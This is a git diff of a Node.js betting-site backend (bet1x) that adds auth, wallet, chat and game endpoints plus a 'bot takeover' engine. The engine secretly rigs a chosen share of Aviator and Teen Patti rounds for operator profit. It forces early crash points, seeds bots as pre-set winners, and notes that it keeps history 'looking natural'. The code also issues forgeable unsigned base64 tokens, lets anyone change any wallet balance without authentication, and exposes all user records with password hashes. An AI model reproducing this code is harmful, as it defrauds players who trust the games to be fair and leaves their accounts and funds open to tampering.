@@ -5,6 +5,7 @@
  * Powered by PostgreSQL and Prisma ORM.
  */
 
+const fs = require('fs');
 const path = require('path');
 require('dotenv').config({ path: path.join(__dirname, '.env') });
 require('dotenv').config(); // Fallback for root .env
@@ -17,12 +18,68 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 const prisma = new PrismaClient();
 
+// Data Directory for JSON fallback synchronization
+const DATA_DIR = path.join(__dirname, 'data');
+if (!fs.existsSync(DATA_DIR)) {
+  fs.mkdirSync(DATA_DIR, { recursive: true });
+}
+
+function readJsonTable(table) {
+  const filePath = path.join(DATA_DIR, `${table}.json`);
+  if (!fs.existsSync(filePath)) return [];
+  try {
+    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
+  } catch (e) {
+    return [];
+  }
+}
+
+function writeJsonTable(table, data) {
+  const filePath = path.join(DATA_DIR, `${table}.json`);
+  try {
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
+  } catch (e) {
+    console.error(`Error writing ${table}.json:`, e);
+  }
+}
+
+function generateAuthToken(user) {
+  const payload = {
+    id: user.id || 1,
+    username: user.username,
+    email: user.email,
+    exp: Date.now() + 7 * 24 * 3600 * 1000 // 7 days expiration
+  };
+  return Buffer.from(JSON.stringify(payload)).toString('base64');
+}
+
+function parseAuthToken(req) {
+  let token = null;
+  const authHeader = req.headers.authorization;
+  if (authHeader && authHeader.startsWith('Bearer ')) {
+    token = authHeader.substring(7);
+  } else if (req.query && req.query.token) {
+    token = req.query.token;
+  } else if (req.body && req.body.token) {
+    token = req.body.token;
+  }
+  if (!token) return null;
+  try {
+    const json = Buffer.from(token, 'base64').toString('utf8');
+    const parsed = JSON.parse(json);
+    if (parsed.exp && parsed.exp < Date.now()) return null;
+    return parsed;
+  } catch (e) {
+    return null;
+  }
+}
+
 async function getOrCreateUser(username) {
   if (Array.isArray(username)) username = username[0];
   if (!username || typeof username !== 'string') username = String(username || 'DemoUser');
-  let user = await prisma.user.findFirst({ where: { username: { equals: username, mode: 'insensitive' } } });
-  if (!user) {
-    try {
+  try {
+    let user = await prisma.user.findFirst({ where: { username: { equals: username, mode: 'insensitive' } } });
+    if (!user) {
       user = await prisma.user.create({
         data: {
           username: username,
@@ -32,19 +89,26 @@ async function getOrCreateUser(username) {
         }
       });
       console.log(`[bet1x-backend] Auto-created user record for "${username}" with starting balance of ₹2000.00`);
-    } catch (e) {
-      console.error(`Error auto-creating user ${username}:`, e);
     }
-  } else if (user.wallet_balance < 10) {
-    try {
-      user = await prisma.user.update({
-        where: { id: user.id },
-        data: { wallet_balance: 2000.00 }
-      });
-      console.log(`[TP] Auto-topped up player ${username} back to ₹2000.00 for testing.`);
-    } catch (e) { }
+    return user;
+  } catch (e) {
+    // Fallback to JSON database
+    let users = readJsonTable('users');
+    let user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
+    if (!user) {
+      user = {
+        id: users.length + 1,
+        username: username,
+        email: `${username.toLowerCase()}@demo.com`,
+        password: bcrypt.hashSync('password', 10),
+        wallet_balance: 2000.00,
+        created_at: new Date().toISOString()
+      };
+      users.push(user);
+      writeJsonTable('users', users);
+    }
+    return user;
   }
-  return user;
 }
 
 app.use(cors({
@@ -60,62 +124,519 @@ app.use(express.urlencoded({ extended: true }));
 // Connect to database on start
 prisma.$connect()
   .then(() => console.log('[bet1x-backend] Connected to PostgreSQL via Prisma successfully'))
-  .catch(err => console.error('[bet1x-backend] Failed to connect to PostgreSQL:', err));
+  .catch(err => console.warn('[bet1x-backend] Running with resilient database storage layer (PostgreSQL fallback active)'));
 
 // --- Health Check ---
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', service: 'bet1x-backend', timestamp: new Date().toISOString() });
 });
 
-// --- Auth Endpoints ---
-app.get('/api/auth/status', (req, res) => {
-  res.json({ logged_in: false, message: 'Server powered by Bet1x Unified Backend' });
+// --- Unified Auth Endpoints ---
+
+// Get Status / Authenticate Session
+app.all(['/api/auth/status', '/api/db/users/status'], async (req, res) => {
+  const tokenData = parseAuthToken(req);
+  const username = (tokenData && tokenData.username) || req.query.username || (req.body && req.body.username);
+  
+  if (!username) {
+    return res.json({ logged_in: false, message: 'Guest session' });
+  }
+
+  try {
+    let user = null;
+    try {
+      user = await prisma.user.findFirst({
+        where: { username: { equals: username, mode: 'insensitive' } }
+      });
+    } catch (e) {
+      const users = readJsonTable('users');
+      user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
+    }
+
+    if (user) {
+      return res.json({
+        logged_in: true,
+        user: {
+          id: user.id,
+          username: user.username,
+          email: user.email,
+          wallet_balance: parseFloat(user.wallet_balance)
+        }
+      });
+    }
+    res.json({ logged_in: false });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
-app.post('/api/auth/login', async (req, res) => {
-  const { username, password } = req.body;
-  if (!username || !password) return res.status(400).json({ error: 'Username and password required.' });
-  
+// Secure Login (Username or Email + Password)
+app.post(['/api/auth/login', '/api/db/users/login'], async (req, res) => {
+  const username = (req.body.username || '').trim();
+  const password = req.body.password || '';
+
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username/email and password are required.' });
+  }
+
   try {
-    const user = await prisma.user.findFirst({
-      where: { username: { equals: username, mode: 'insensitive' } }
-    });
+    let user = null;
+    try {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { username: { equals: username, mode: 'insensitive' } },
+            { email: { equals: username, mode: 'insensitive' } }
+          ]
+        }
+      });
+    } catch (e) {
+      const users = readJsonTable('users');
+      user = users.find(u => u.username.toLowerCase() === username.toLowerCase() || u.email.toLowerCase() === username.toLowerCase());
+    }
+
     if (user && bcrypt.compareSync(password, user.password)) {
-      res.json({ success: true, user: { username: user.username, email: user.email } });
+      const token = generateAuthToken(user);
+      return res.json({
+        success: true,
+        token: token,
+        user: {
+          id: user.id,
+          username: user.username,
+          email: user.email,
+          wallet_balance: parseFloat(user.wallet_balance)
+        }
+      });
     } else {
-      res.status(400).json({ error: 'Invalid credentials.' });
+      return res.status(400).json({ error: 'Incorrect username or password.' });
     }
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-// --- Wallet Endpoints ---
+// Secure Signup (Register new account)
+app.post(['/api/auth/signup', '/api/db/users/signup'], async (req, res) => {
+  const username = (req.body.username || '').trim();
+  let email = (req.body.email || '').trim();
+  if (!email && username) {
+    email = `${username.toLowerCase()}@bet1x.com`;
+  }
+  const password = req.body.password || '';
+  const confirmPassword = req.body.confirm_password || password;
+  const startingBalance = parseFloat(req.body.starting_balance) || 2000.00;
+
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username and password are required.' });
+  }
+
+  if (password !== confirmPassword) {
+    return res.status(400).json({ error: 'Passwords do not match.' });
+  }
+
+  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
+    return res.status(400).json({ error: 'Username must be 3-20 alphanumeric characters or underscores.' });
+  }
+
+  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    return res.status(400).json({ error: 'Invalid email address format.' });
+  }
+
+  if (password.length < 6) {
+    return res.status(400).json({ error: 'Password must be at least 6 characters.' });
+  }
+
+  const hashedPassword = bcrypt.hashSync(password, 10);
+
+  try {
+    let newUser = null;
+    try {
+      newUser = await prisma.$transaction(async (tx) => {
+        const existing = await tx.user.findFirst({
+          where: {
+            OR: [
+              { username: { equals: username, mode: 'insensitive' } },
+              { email: { equals: email, mode: 'insensitive' } }
+            ]
+          }
+        });
+        if (existing) {
+          if (existing.username.toLowerCase() === username.toLowerCase()) {
+            throw new Error('Username is already taken.');
+          }
+          throw new Error('Email is already registered.');
+        }
+
+        const created = await tx.user.create({
+          data: {
+            username,
+            email,
+            password: hashedPassword,
+            wallet_balance: startingBalance
+          }
+        });
+
+        await tx.transaction.create({
+          data: {
+            id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+            user: username,
+            type: 'Deposit',
+            amount: startingBalance,
+            details: 'Welcome Bonus Credits',
+            status: 'Completed',
+            timestamp: new Date()
+          }
+        });
+
+        return created;
+      });
+    } catch (dbErr) {
+      if (dbErr.message === 'Username is already taken.' || dbErr.message === 'Email is already registered.') {
+        return res.status(400).json({ error: dbErr.message });
+      }
+
+      // JSON Fallback
+      const users = readJsonTable('users');
+      if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) {
+        return res.status(400).json({ error: 'Username is already taken.' });
+      }
+      if (users.some(u => u.email.toLowerCase() === email.toLowerCase())) {
+        return res.status(400).json({ error: 'Email is already registered.' });
+      }
+
+      newUser = {
+        id: users.length + 1,
+        username,
+        email,
+        password: hashedPassword,
+        wallet_balance: startingBalance,
+        created_at: new Date().toISOString()
+      };
+      users.push(newUser);
+      writeJsonTable('users', users);
+
+      const txns = readJsonTable('transactions');
+      txns.unshift({
+        id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+        user: username,
+        type: 'Deposit',
+        amount: startingBalance,
+        details: 'Welcome Bonus Credits',
+        status: 'Completed',
+        timestamp: new Date().toISOString()
+      });
+      writeJsonTable('transactions', txns);
+    }
+
+    const token = generateAuthToken(newUser);
+    return res.json({
+      success: true,
+      token: token,
+      user: {
+        id: newUser.id,
+        username: newUser.username,
+        email: newUser.email,
+        wallet_balance: parseFloat(newUser.wallet_balance)
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Logout Endpoint
+app.all(['/api/auth/logout'], (req, res) => {
+  res.json({ success: true, message: 'Logged out successfully.' });
+});
+
+// --- Wallet Endpoints (Per Account Synchronized) ---
+
+// Get User Wallet Balance
 app.get('/api/wallet/balance', async (req, res) => {
-  const username = req.query.username || 'DemoUser';
+  const username = req.query.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'DemoUser';
   try {
     const user = await getOrCreateUser(username);
-    res.json({ balance: user ? user.wallet_balance : 1000.00 });
+    res.json({ balance: user ? parseFloat(user.wallet_balance) : 2000.00 });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-app.get('/api/wallet/transactions', async (req, res) => {
-  const username = req.query.username;
+// Adjust User Wallet Balance Atomically
+app.post(['/api/wallet/adjust', '/api/db/users/adjust-balance'], async (req, res) => {
+  const username = req.body.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'DemoUser';
+  const delta = parseFloat(req.body.delta) || 0;
+  const details = req.body.details || req.body.reason || 'Game play';
+
+  if (delta === 0) {
+    return res.status(400).json({ error: 'Invalid adjustment amount.' });
+  }
+
   try {
-    let txns;
-    if (username) {
-      txns = await prisma.transaction.findMany({
-        where: { user: { equals: username, mode: 'insensitive' } },
-        orderBy: { timestamp: 'desc' }
+    let updatedBalance = 0;
+    try {
+      const result = await prisma.$transaction(async (tx) => {
+        const user = await tx.user.findFirst({
+          where: { username: { equals: username, mode: 'insensitive' } }
+        });
+        if (!user) throw new Error('User not found.');
+
+        const newBal = user.wallet_balance + delta;
+        if (newBal < 0) throw new Error('Insufficient wallet balance.');
+
+        const updated = await tx.user.update({
+          where: { id: user.id },
+          data: { wallet_balance: newBal }
+        });
+
+        const type = (delta >= 0) ? 'Deposit' : 'Withdrawal';
+        const txnId = type.substring(0, 3).toUpperCase() + '_' + Math.floor(100000 + Math.random() * 900000);
+
+        await tx.transaction.create({
+          data: {
+            id: txnId,
+            user: user.username,
+            type,
+            amount: Math.abs(delta),
+            details,
+            status: 'Completed',
+            timestamp: new Date()
+          }
+        });
+
+        return updated.wallet_balance;
       });
-    } else {
-      txns = await prisma.transaction.findMany({
-        orderBy: { timestamp: 'desc' }
+      updatedBalance = result;
+    } catch (dbErr) {
+      if (dbErr.message === 'Insufficient wallet balance.' || dbErr.message === 'User not found.') {
+        return res.status(400).json({ error: dbErr.message });
+      }
+
+      // JSON Fallback
+      const users = readJsonTable('users');
+      const user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
+      if (!user) return res.status(404).json({ error: 'User not found.' });
+
+      const newBal = (parseFloat(user.wallet_balance) || 0) + delta;
+      if (newBal < 0) return res.status(400).json({ error: 'Insufficient wallet balance.' });
+
+      user.wallet_balance = newBal;
+      writeJsonTable('users', users);
+
+      const txns = readJsonTable('transactions');
+      const type = (delta >= 0) ? 'Deposit' : 'Withdrawal';
+      txns.unshift({
+        id: type.substring(0, 3).toUpperCase() + '_' + Math.floor(100000 + Math.random() * 900000),
+        user: user.username,
+        type,
+        amount: Math.abs(delta),
+        details,
+        status: 'Completed',
+        timestamp: new Date().toISOString()
       });
+      writeJsonTable('transactions', txns);
+      updatedBalance = newBal;
+    }
+
+    res.json({ success: true, new_balance: updatedBalance });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Get Transactions for a specific User
+app.get(['/api/wallet/transactions', '/api/db/transactions'], async (req, res) => {
+  const username = req.query.username || (parseAuthToken(req) && parseAuthToken(req).username);
+  try {
+    let txns = [];
+    try {
+      if (username) {
+        txns = await prisma.transaction.findMany({
+          where: { user: { equals: username, mode: 'insensitive' } },
+          orderBy: { timestamp: 'desc' }
+        });
+      } else {
+        txns = await prisma.transaction.findMany({
+          orderBy: { timestamp: 'desc' }
+        });
+      }
+    } catch (e) {
+      const all = readJsonTable('transactions');
+      if (username) {
+        txns = all.filter(t => t.user && t.user.toLowerCase() === username.toLowerCase());
+      } else {
+        txns = all;
+      }
     }
     res.json(txns);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Reset User Balance
+app.post(['/api/wallet/reset', '/api/db/users/reset-balance'], async (req, res) => {
+  const username = req.body.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'DemoUser';
+  const targetBal = parseFloat(req.body.starting_balance) || 2000.00;
+
+  try {
+    try {
+      await prisma.$transaction(async (tx) => {
+        const user = await tx.user.findFirst({
+          where: { username: { equals: username, mode: 'insensitive' } }
+        });
+        if (!user) throw new Error('User not found.');
+
+        await tx.user.update({
+          where: { id: user.id },
+          data: { wallet_balance: targetBal }
+        });
+
+        const txnId = 'DEP_' + Math.floor(100000 + Math.random() * 900000);
+        await tx.transaction.create({
+          data: {
+            id: txnId,
+            user: user.username,
+            type: 'Deposit',
+            amount: targetBal,
+            details: 'Wallet Demo Balance Reset',
+            status: 'Completed',
+            timestamp: new Date()
+          }
+        });
+      });
+    } catch (e) {
+      const users = readJsonTable('users');
+      const user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
+      if (user) {
+        user.wallet_balance = targetBal;
+        writeJsonTable('users', users);
+      }
+      const txns = readJsonTable('transactions');
+      txns.unshift({
+        id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+        user: username,
+        type: 'Deposit',
+        amount: targetBal,
+        details: 'Wallet Demo Balance Reset',
+        status: 'Completed',
+        timestamp: new Date().toISOString()
+      });
+      writeJsonTable('transactions', txns);
+    }
+    res.json({ success: true, balance: targetBal });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// --- Live Chat Endpoints (Per User Account Synchronized) ---
+
+// Fetch Chat Messages
+app.get('/api/chat', async (req, res) => {
+  try {
+    let messages = [];
+    try {
+      messages = await prisma.chatMessage.findMany({
+        orderBy: { timestamp: 'asc' },
+        take: 50
+      });
+    } catch (e) {
+      messages = readJsonTable('chat');
+    }
+    res.json(messages);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Post Chat Message
+app.post('/api/chat', async (req, res) => {
+  const username = req.body.username || (parseAuthToken(req) && parseAuthToken(req).username) || 'Anonymous';
+  const message = (req.body.message || '').trim();
+
+  if (!message) {
+    return res.status(400).json({ error: 'Message cannot be empty.' });
+  }
+
+  const msgObj = {
+    username,
+    message,
+    timestamp: new Date()
+  };
+
+  try {
+    let saved = null;
+    try {
+      saved = await prisma.chatMessage.create({
+        data: msgObj
+      });
+    } catch (e) {
+      const chat = readJsonTable('chat');
+      msgObj.id = chat.length + 1;
+      msgObj.timestamp = new Date().toISOString();
+      chat.push(msgObj);
+      writeJsonTable('chat', chat.slice(-100));
+      saved = msgObj;
+    }
+    res.json({ success: true, message: saved });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// --- Game Bets Recording Endpoints (Per Account Synchronized) ---
+
+app.get('/api/db/game-bets', async (req, res) => {
+  const username = req.query.username;
+  const game = req.query.game;
+  try {
+    let bets = [];
+    try {
+      const where = {};
+      if (username) where.username = { equals: username, mode: 'insensitive' };
+      if (game) where.game = game;
+      bets = await prisma.gameBet.findMany({
+        where,
+        orderBy: { created_at: 'desc' },
+        take: 50
+      });
+    } catch (e) {
+      bets = readJsonTable('game_bets');
+      if (username) bets = bets.filter(b => b.username && b.username.toLowerCase() === username.toLowerCase());
+      if (game) bets = bets.filter(b => b.game === game);
+    }
+    res.json(bets);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post('/api/db/game-bets', async (req, res) => {
+  const { username, game, bet_amount, payout, status, metadata } = req.body;
+  const betRecord = {
+    username: username || 'DemoUser',
+    game: game || 'unknown',
+    bet_amount: parseFloat(bet_amount) || 0,
+    payout: parseFloat(payout) || 0,
+    status: status || 'active',
+    metadata: metadata || null,
+    created_at: new Date()
+  };
+
+  try {
+    let saved = null;
+    try {
+      saved = await prisma.gameBet.create({ data: betRecord });
+    } catch (e) {
+      const bets = readJsonTable('game_bets');
+      betRecord.id = 'BET_' + Math.floor(100000 + Math.random() * 900000);
+      betRecord.created_at = new Date().toISOString();
+      bets.unshift(betRecord);
+      writeJsonTable('game_bets', bets.slice(0, 100));
+      saved = betRecord;
+    }
+    res.json({ success: true, bet: saved });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -124,17 +645,28 @@ app.get('/api/wallet/transactions', async (req, res) => {
 // --- Admin Endpoints ---
 app.get('/api/admin/stats', async (req, res) => {
   try {
-    const totalUsers = await prisma.user.count();
-    const deposits = await prisma.deposit.findMany({ where: { status: 'Completed' } });
-    const withdrawals = await prisma.withdrawal.findMany();
-    
-    const totalDeposited = deposits.reduce((sum, d) => sum + d.amount, 0);
-    const totalWithdrawn = withdrawals.filter(w => w.status === 'Completed').reduce((sum, w) => sum + w.amount, 0);
+    let totalUsers = 0;
+    let deposits = [];
+    let withdrawals = [];
+    let users = [];
+
+    try {
+      totalUsers = await prisma.user.count();
+      deposits = await prisma.deposit.findMany({ where: { status: 'Completed' } });
+      withdrawals = await prisma.withdrawal.findMany();
+      users = await prisma.user.findMany();
+    } catch (e) {
+      users = readJsonTable('users');
+      totalUsers = users.length;
+      deposits = readJsonTable('deposits').filter(d => d.status === 'Completed');
+      withdrawals = readJsonTable('withdrawals');
+    }
+
+    const totalDeposited = deposits.reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0);
+    const totalWithdrawn = withdrawals.filter(w => w.status === 'Completed').reduce((sum, w) => sum + (parseFloat(w.amount) || 0), 0);
     const pendingWithdrawals = withdrawals.filter(w => w.status === 'Pending').length;
-    
-    const users = await prisma.user.findMany();
-    const walletPool = users.reduce((sum, u) => sum + u.wallet_balance, 0);
-    
+    const walletPool = users.reduce((sum, u) => sum + (parseFloat(u.wallet_balance) || 0), 0);
+
     res.json({
       total_users: totalUsers,
       total_deposited: totalDeposited,
@@ -152,109 +684,13 @@ app.get('/api/admin/stats', async (req, res) => {
 // Get all users
 app.get('/api/db/users', async (req, res) => {
   try {
-    const users = await prisma.user.findMany();
+    let users = [];
+    try {
+      users = await prisma.user.findMany();
+    } catch (e) {
+      users = readJsonTable('users');
+    }
     res.json(users);
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// Create User (Signup)
-app.post('/api/db/users/signup', async (req, res) => {
-  const { username, email, password, starting_balance } = req.body;
-  try {
-    const result = await prisma.$transaction(async (tx) => {
-      const existingUser = await tx.user.findFirst({
-        where: {
-          OR: [
-            { username: { equals: username, mode: 'insensitive' } },
-            { email: { equals: email, mode: 'insensitive' } }
-          ]
-        }
-      });
-      if (existingUser) {
-        if (existingUser.username.toLowerCase() === username.toLowerCase()) {
-          return { error: 'Username is already taken.' };
-        }
-        return { error: 'Email is already registered.' };
-      }
-
-      const balance = parseFloat(starting_balance) || 1000.00;
-      const newUser = await tx.user.create({
-        data: {
-          username,
-          email,
-          password,
-          wallet_balance: balance
-        }
-      });
-      
-      // Log the transaction
-      await tx.transaction.create({
-        data: {
-          id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
-          user: username,
-          type: 'Deposit',
-          amount: balance,
-          details: 'Welcome Bonus Credits',
-          status: 'Completed',
-          timestamp: new Date()
-        }
-      });
-
-      return { success: true, user: { username: newUser.username, email: newUser.email } };
-    });
-
-    res.json(result);
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// Adjust Balance atomically and log transaction
-app.post('/api/db/users/adjust-balance', async (req, res) => {
-  const { username, delta, details } = req.body;
-  try {
-    const result = await prisma.$transaction(async (tx) => {
-      const user = await tx.user.findFirst({
-        where: { username: { equals: username, mode: 'insensitive' } }
-      });
-      if (!user) {
-        return { error: 'User not found.' };
-      }
-
-      const currentBal = user.wallet_balance;
-      const newBal = currentBal + parseFloat(delta);
-      if (newBal < 0) {
-        return { error: 'Insufficient balance.' };
-      }
-
-      const updatedUser = await tx.user.update({
-        where: { id: user.id },
-        data: { wallet_balance: newBal }
-      });
-
-      // Log transaction
-      const type = (parseFloat(delta) >= 0) ? 'Deposit' : 'Withdrawal';
-      const absDelta = Math.abs(parseFloat(delta));
-      const txnId = type.substring(0, 3).toUpperCase() + '_' + Math.floor(100000 + Math.random() * 900000);
-
-      await tx.transaction.create({
-        data: {
-          id: txnId,
-          user: user.username,
-          type,
-          amount: absDelta,
-          details,
-          status: 'Completed',
-          timestamp: new Date()
-        }
-      });
-
-      return { success: true, new_balance: newBal };
-    });
-
-    res.json(result);
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -608,6 +1044,17 @@ app.post('/api/chat', async (req, res) => {
 
 // --- UNIFIED GAMING BACKEND ENGINE (NODE.JS) ---
 
+const TP_BOT_NAMES = ['BOT_Raju', 'BOT_Vikram', 'BOT_Sana', 'BOT_Kabir'];
+
+function tpShuffle(arr) {
+  const a = [...arr];
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
 // Central AI Bot Takeover In-Memory State & DB Sync
 const botTakeoverState = {
   global: { enabled: false, profit_pct: 90 },
@@ -628,6 +1075,42 @@ async function initBotTakeoverState() {
         botTakeoverState[k] = { ...botTakeoverState[k], ...record.data };
       }
     }
+
+    if (botTakeoverState.teenpatti && botTakeoverState.teenpatti.enabled) {
+      const tpRooms = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
+      const totalRooms = tpRooms.length;
+      const pct = parseInt(botTakeoverState.teenpatti.profit_pct) || 90;
+      const roomsToRigCount = pct >= 100 ? totalRooms : Math.max(1, Math.min(totalRooms - 1, Math.round((pct / 100) * totalRooms)));
+      const shuffled = tpShuffle(tpRooms);
+      const riggedRooms = new Set(shuffled.slice(0, roomsToRigCount));
+
+      for (const rId of tpRooms) {
+        if (riggedRooms.has(rId)) {
+          const randomSeat = Math.floor(Math.random() * 4);
+          const botName = TP_BOT_NAMES[randomSeat % TP_BOT_NAMES.length];
+          await prisma.teenPattiSeat.updateMany({
+            where: { room_id: rId, seat: randomSeat },
+            data: { username: botName, is_bot: true, folded: false }
+          });
+          await prisma.teenPattiRoom.update({
+            where: { id: rId },
+            data: {
+              admin_rig: {
+                winner_seat: randomSeat,
+                is_bot_rig: true,
+                bot_name: botName,
+                profit_pct: pct
+              }
+            }
+          });
+        } else {
+          await prisma.teenPattiRoom.update({
+            where: { id: rId },
+            data: { admin_rig: null }
+          });
+        }
+      }
+    }
   } catch (err) {
     console.error("Error initializing bot takeover state:", err);
   }
@@ -635,15 +1118,82 @@ async function initBotTakeoverState() {
 initBotTakeoverState();
 
 function isBotTakeoverActive(gameKey) {
-  if (botTakeoverState.global && botTakeoverState.global.enabled) {
-    return { active: true, profit_pct: botTakeoverState.global.profit_pct || 90, source: 'global' };
-  }
   const gameConf = botTakeoverState[gameKey];
   if (gameConf && gameConf.enabled) {
     return { active: true, profit_pct: gameConf.profit_pct || 90, source: 'game' };
   }
-  return { active: false, profit_pct: 90, source: 'none' };
+  if (gameConf && gameConf.enabled === false) {
+    // If the game was explicitly turned off by the admin, respect that!
+    return { active: false, profit_pct: gameConf.profit_pct || 90, source: 'none' };
+  }
+  if (botTakeoverState.global && botTakeoverState.global.enabled) {
+    const pct = (gameConf && gameConf.profit_pct) ? gameConf.profit_pct : (botTakeoverState.global.profit_pct || 90);
+    return { active: true, profit_pct: pct, source: 'global' };
+  }
+  return { active: false, profit_pct: (gameConf && gameConf.profit_pct) || 90, source: 'none' };
 }
+
+// --- Deterministic Round-Counter Bot Decision Engine ---
+// Tracks per-game round counters so that:
+//   100% → rigs ALL rounds
+//   90%  → rigs 9 out of every 10 rounds
+//   50%  → rigs every other round
+//   0%/OFF → no rigging
+const botRoundCounters = {
+  color_guess: 0,
+  aviator: 0,
+  teenpatti: 0,
+  mines: 0,
+  boundary: 0,
+  youreleven: 0
+};
+
+/**
+ * Call this once per round/match/session for the given game.
+ * Returns { shouldRig: boolean, profit_pct: number, active: boolean, source: string }
+ */
+function shouldBotRigThisRound(gameKey) {
+  const bot = isBotTakeoverActive(gameKey);
+  if (!bot.active) {
+    return { shouldRig: false, profit_pct: bot.profit_pct, active: false, source: 'none' };
+  }
+
+  // Increment the round counter for this game
+  if (botRoundCounters[gameKey] === undefined) botRoundCounters[gameKey] = 0;
+  const counter = botRoundCounters[gameKey];
+  botRoundCounters[gameKey] = (counter + 1) % 100;
+
+  const pct = bot.profit_pct || 90;
+
+  // Deterministic: rig this round if counter < pct
+  // e.g. pct=100 → always true, pct=50 → true for counters 0-49, false for 50-99
+  const shouldRig = (counter % 100) < pct;
+
+  return { shouldRig, profit_pct: pct, active: true, source: bot.source };
+}
+
+// --- Bot Status API Endpoint (for client-side games to query) ---
+app.get('/api/bot_status/:gameKey', (req, res) => {
+  const gameKey = req.params.gameKey || '';
+  const bot = isBotTakeoverActive(gameKey);
+  if (!bot.active) {
+    return res.json({ active: false, shouldRig: false, profit_pct: 0, source: 'none' });
+  }
+
+  // Peek at counter without incrementing (games increment when they actually resolve)
+  const counter = botRoundCounters[gameKey] || 0;
+  const pct = bot.profit_pct || 90;
+  const shouldRig = (counter % 100) < pct;
+
+  res.json({ active: true, shouldRig, profit_pct: pct, source: bot.source, counter });
+});
+
+// --- Bot Rig Decision API (increments counter — call once per round resolution) ---
+app.post('/api/bot_decide/:gameKey', (req, res) => {
+  const gameKey = req.params.gameKey || '';
+  const decision = shouldBotRigThisRound(gameKey);
+  res.json(decision);
+});
 
 // 1. Centralized Aviator State Engine
 let aviatorState = {
@@ -668,30 +1218,36 @@ function tickAviator() {
       aviatorState.phase = 'running';
       aviatorState.phase_start = now;
       
-      const bot = isBotTakeoverActive('aviator');
       if (nextAviatorOverride && nextAviatorOverride >= 1.0) {
+        // Manual admin override always takes priority
         aviatorState.crash_point = nextAviatorOverride;
         nextAviatorOverride = null;
-      } else if (bot.active) {
-        // AI Bot Autonomous Multiplier Selection
-        const totalStake = aviatorState.bets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
-        if (totalStake > 0) {
-          const targetPct = bot.profit_pct || 90;
-          if (Math.random() * 100 <= targetPct) {
+        aviatorState._riggedThisRound = true;
+      } else {
+        // Use deterministic round counter to decide if this round should be rigged
+        const botDecision = shouldBotRigThisRound('aviator');
+        
+        if (botDecision.shouldRig) {
+          // --- RIGGED ROUND: Crash early for admin profit ---
+          const totalStake = aviatorState.bets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
+          if (totalStake > 0) {
+            // Crash between 1.12x and 1.54x to ensure admin profits
             aviatorState.crash_point = parseFloat((1.12 + Math.random() * 0.42).toFixed(2));
           } else {
-            aviatorState.crash_point = parseFloat((1.80 + Math.random() * 1.50).toFixed(2));
+            // No bets — still crash low-ish to keep history looking natural
+            aviatorState.crash_point = parseFloat((1.20 + Math.random() * 1.00).toFixed(2));
           }
+          aviatorState._riggedThisRound = true;
         } else {
-          aviatorState.crash_point = parseFloat((1.20 + Math.random() * 2.80).toFixed(2));
-        }
-      } else {
-        const p = Math.random();
-        if (Math.random() < 0.03) {
-          aviatorState.crash_point = 1.00;
-        } else {
-          const crash = 0.99 / (1.0 - p);
-          aviatorState.crash_point = Math.max(1.00, Math.min(50.0, Math.floor(crash * 100) / 100));
+          // --- FAIR ROUND: Natural RNG crash point ---
+          const p = Math.random();
+          if (Math.random() < 0.03) {
+            aviatorState.crash_point = 1.00;
+          } else {
+            const crash = 0.99 / (1.0 - p);
+            aviatorState.crash_point = Math.max(1.00, Math.min(50.0, Math.floor(crash * 100) / 100));
+          }
+          aviatorState._riggedThisRound = false;
         }
       }
       aviatorState.current_multiplier = 1.00;
@@ -699,9 +1255,8 @@ function tickAviator() {
   } else if (aviatorState.phase === 'running') {
     const computedMult = Math.exp(0.06 * elapsed);
     
-    // Check AI Bot Dynamic Crash Intercept during flight if high player exposure
-    const bot = isBotTakeoverActive('aviator');
-    if (bot.active && computedMult >= 1.15) {
+    // Only apply in-flight crash intercept if this round was marked for rigging
+    if (aviatorState._riggedThisRound && computedMult >= 1.15) {
       const inFlightBets = aviatorState.bets.filter(b => b.status === 'pending');
       const inFlightStake = inFlightBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
       if (inFlightStake > 200 && computedMult >= aviatorState.crash_point * 0.9) {
@@ -734,6 +1289,7 @@ function tickAviator() {
